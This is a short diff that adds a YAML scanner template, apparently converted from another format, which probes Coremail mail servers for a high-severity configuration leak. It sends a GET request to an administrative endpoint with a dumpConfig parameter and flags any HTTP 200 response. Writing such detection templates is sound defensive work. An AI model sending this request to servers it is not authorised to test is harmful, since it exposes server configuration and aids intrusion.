@@ -1,0 +1,18 @@
+id: yaml-poc-coremail-coremail-leak-CT-158053
+info:
+  name: Yaml Poc Coremail Coremail Leak Ct 158053
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-coremail-coremail-leak-CT-158053'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /mailsms/s?func=ADMIN:appState&dumpConfig=/
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
